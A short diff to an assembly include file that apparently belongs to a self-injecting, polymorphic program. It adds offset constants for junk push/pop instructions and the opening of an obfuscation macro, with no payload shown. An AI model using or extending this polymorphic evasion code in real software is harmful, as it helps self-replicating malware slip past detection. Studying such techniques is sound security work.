@@ -113,9 +113,24 @@
 ;POLY INC R10
 %define POLY_INC_R10_1_OFFSET inject_self.poly_inc_r10_1 - _start
 
+
+
+;POLY USELESS PUSH RAX OPS POP RAX
+%define POLY_PUSH_POP_1_OFFSET 1+_start.poly_push_ops_pop - _start
+%define POLY_PUSH_POP_2_OFFSET 1+_start.poly_push_ops_pop2 - _start
+%define POLY_PUSH_POP_3_OFFSET 1+inject_self.poly_push_ops_pop3 - _start
+
+
+%define POLY_PUSH_POP_SIZE	8
+%define POLY_PUSH_POP_NUMBER 5
+
 %define POLY_INC_SIZE 8
 %define POLY_INC_NUMBER 0x000000004
 
+
+
+
+;OBF POLY MACRO
 %macro OBF_POLY_1 0
 	OBF_PUSH_RAX
 	OBF_PUSH_RDI
